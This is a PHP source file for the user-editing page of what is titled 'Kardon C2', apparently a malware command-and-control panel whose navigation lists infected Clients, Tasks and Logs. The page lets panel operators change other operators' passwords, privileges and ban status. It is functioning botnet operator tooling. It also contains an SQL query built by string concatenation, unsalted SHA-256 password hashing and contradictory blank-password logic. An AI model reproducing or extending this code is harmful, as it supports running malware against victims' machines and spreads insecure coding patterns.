<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';  
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);  
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    label {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 13px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    h6 {
      font-family: "Roboto","Helvetica","Arial",sans-serif;
      font-size: 18px;
      line-height: 1;
      letter-spacing: .02em;
      font-weight: 400;
      box-sizing: border-box;
      color: #757575
    }
    </style>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--grey-100 mdl-color-text--grey-600">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Edit User</span>
          <div class="mdl-layout-spacer"></div>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--blue-grey-900 mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--blue-grey-800">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--grey-100">
        <div class="mdl-grid demo-content">
        <?php
						if ($userperms == "user")
						{
							echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>You do not have permission to view this page.</h6></center></div>';
							die();
						}
						if (!isset($_GET['id']))
						{
							echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>No ID provided. Redirecting...</h6></center></div><meta http-equiv="refresh" content="2;url=users.php">';
							die();
						}else{
							if (!ctype_digit($_GET['id']))
							{
								echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>ID was not a digit. Redirecting...</h6></center></div><meta http-equiv="refresh" content="2;url=users.php">';
								die();
							}
						}
						$uid = $_GET['id'];
						$cnt = $odb->prepare("SELECT COUNT(*) FROM users WHERE id = :i");
						$cnt->execute(array(":i" => $uid));
						if ($cnt->fetchColumn(0) == "0")
						{
							echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>User was not found in database. Redirecting...</h6></center></div><meta http-equiv="refresh" content="2;url=users.php">';
							die();
						}
						if ($uid == "1")
						{
							echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>This user cannot be modified. Redirecting...</h6></center></div><meta http-equiv="refresh" content="2;url=users.php">';
							die();
						}
						$uss = $odb->prepare("SELECT * FROM users WHERE id = :i");
						$uss->execute(array(":i" => $uid));
						$us = $uss->fetch(PDO::FETCH_ASSOC);
						if (isset($_POST['doEdit']))
						{
							$npass = $_POST['newpass'];
							$npcon = $_POST['newpass2'];
							$newpe = $_POST['perms'];
							$newst = $_POST['status'];
							if (empty($npass) || empty($npcon) || empty($newpe) || empty($newst))
							{
								echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>One of the fields were empty.</h6></center></div>';
							}else{
								if ($npass == $npcon)
								{
									if (ctype_digit($newpe))
									{
										if (ctype_digit($newst))
										{
											$newperm = "";
											switch ($newpe)
											{
												case "1":
													$newperm = "user";
													break;
												case "2":
													$newperm = "moderator";
													break;
												case "3":
													$newperm = "admin";
													break;
											}
											if ($userperms == "moderator" && $us['privileges'] != "admin")
											{
												if ($npass != "" || $npass != NULL)
												{
													$hashed = hash("sha256", $npass);
													$up = $odb->prepare("UPDATE users SET password = :p, privileges = :pm, status = :s WHERE id = :i");
													$up->execute(array(":p" => $hashed, ":pm" => $newperm, ":s" => $newst, ":i" => $uid));
													$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
													$in->execute(array(":u" => $username, ":ip" => $_SESSION['REMOTE_ADDR'], ":r" => "Edited user ".$us['username']));
													echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Successfully updated user. Reloading...</h6></center></div><meta http-equiv="refresh" content="2">';
												}else{
													$up = $odb->prepare("UPDATE users SET privileges = :p, status = :s WHERE id = :i");
													$up->execute(array(":p" => $newperm, ":s" => $newst, ":i" => $uid));
													$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
													$in->execute(array(":u" => $username, ":ip" => $_SESSION['REMOTE_ADDR'], ":r" => "Edited user ".$us['username']));
													echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Successfully updated user. Reloading...</h6></center></div><meta http-equiv="refresh" content="2">';
												}
											}else{
												echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>You cannot edit administrative users.</h6></center></div>';
											}
										}else{
											echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Status was not a digit.</h6></center></div>';
										}
									}else{
										echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Permissions was not a digit.</h6></center></div>';
									}
								}else{
									echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>">Passwords did not match.</h6></center></div>';
								}
							}
						}
					?>
        </div>
        <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--4-col">
          <center>
            <br>
            <h6>Editing user <b><?php echo $us['username']; ?></b></h6>
            <br>
            <form action="" method="POST">
              <label>New Password</label>
              <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="password" class="form-control" name="newpass" placeholder="Leave blank for old password"></div>
              <br>
              <label>Repeat Verification</label>
              <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="password" class="form-control" name="newpass2" placeholder="Leave blank for old password"></div>
              <br>
              <label>Permissions</label>
              <select class="form-control" name="perms">
										<?php
										switch ($us['privileges'])
										{
											case "user":
												echo '<option value="1" selected>User</option><option value="2">Moderator</option><option value="3">Admin</option>';
												break;
											case "moderator":
												echo '<option value="1">User</option><option value="2" selected>Moderator</option><option value="3">Admin</option>';
												break;
											case "admin":
												echo '<option value="1">User</option><option value="2">Moderator</option><option value="3" selected>Admin</option>';
												break;
										}
										?>
									</select>
              <br><br>
              <label>Status</label>
              <select class="form-control" name="status">
										<?php
										if ($us['status'] == "1")
										{
											echo '<option value="1">Active</option><option value="2">Banned</option>';
										}else{
											echo '<option value="1">Active</option><option value="2">Banned</option>';
										}
										?>
									</select>
              <br><br>
              <input type="submit" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--green-500" name="doEdit" value="Edit User">
              <br><br>
            </form>
          </center>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>
